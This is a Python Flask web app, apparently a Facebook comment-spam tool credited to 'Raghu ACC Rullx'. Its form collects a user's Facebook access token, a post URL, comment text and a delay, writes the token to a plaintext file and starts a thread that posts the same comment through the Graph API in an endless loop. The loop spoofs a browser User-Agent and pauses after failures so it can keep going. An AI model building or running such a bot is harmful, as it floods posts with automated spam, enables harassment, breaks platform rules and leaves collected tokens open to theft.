from flask import Flask, request, render_template_string
import os
import threading
import time
import requests

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

TOKEN_FILE = os.path.join(DATA_DIR, "token.txt")
POST_FILE = os.path.join(DATA_DIR, "post_url.txt")
COMMENT_FILE = os.path.join(DATA_DIR, "comment.txt")
TIME_FILE = os.path.join(DATA_DIR, "time.txt")

def save_data(token, post_url, comment_text, delay):
    with open(TOKEN_FILE, "w") as f:
        f.write(token.strip())
    with open(POST_FILE, "w") as f:
        f.write(post_url.strip())
    with open(COMMENT_FILE, "w") as f:
        f.write(comment_text.strip())
    with open(TIME_FILE, "w") as f:
        f.write(str(delay))

def send_comments():
    try:
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
        with open(POST_FILE, "r") as f:
            post_url = f.read().strip()
        with open(COMMENT_FILE, "r") as f:
            comment_text = f.read().strip()
        with open(TIME_FILE, "r") as f:
            delay = int(f.read().strip())

        if not (token and post_url and comment_text):
            print("[!] Missing required data.")
            return

        # Post ID extract karein
        post_id = post_url.split("/")[-1].split("?")[0]

        # Facebook Graph API endpoint
        url = f"https://graph.facebook.com/v15.0/{post_id}/comments"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Content-Type": "application/json"
        }

        payload = {
            "access_token": token,
            "message": comment_text
        }

        while True:
            response = requests.post(url, data=payload, headers=headers)
            if response.status_code == 200:
                print(f"[+] Comment sent: {comment_text}")
            else:
                print(f"[x] Failed: {response.status_code} {response.text}")
                # Agar fail ho, to 5 minutes ka break lein
                time.sleep(300)

            # Delay between comments
            time.sleep(delay)

    except Exception as e:
        print(f"[!] Error: {e}")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Created by Raghu ACC Rullx</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { background: #111; max-width: 400px; margin: 50px auto; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }
        h1 { color: #00ffcc; }
        form { display: flex; flex-direction: column; }
        label { text-align: left; font-weight: bold; margin: 10px 0 5px; }
        input, textarea { padding: 10px; border: 1px solid #444; border-radius: 5px; background: #222; color: white; margin-bottom: 10px; }
        button { background-color: #00ffcc; color: black; padding: 10px; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #00cc99; }
        footer { margin-top: 20px; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Created by Raghu ACC Rullx</h1>
        <form action="/" method="post">
            <label>Enter Your Access Token:</label>
            <textarea name="token" rows="4" required></textarea>

            <label>Enter Post URL:</label>
            <input type="text" name="post_url" required>

            <label>Enter Comment Text:</label>
            <input type="text" name="comment_text" required>

            <label>Delay in Seconds:</label>
            <input type="number" name="delay" value="60" min="1">

            <button type="submit">Submit Your Details</button>
        </form>
        <footer>© 2025 Created by Raghu ACC Rullx. All Rights Reserved.</footer>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        token = request.form.get("token")
        post_url = request.form.get("post_url")
        comment_text = request.form.get("comment_text")
        delay = int(request.form.get("delay", 60))

        if token and post_url and comment_text:
            save_data(token, post_url, comment_text, delay)
            threading.Thread(target=send_comments, daemon=True).start()

    return render_template_string(HTML_TEMPLATE)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
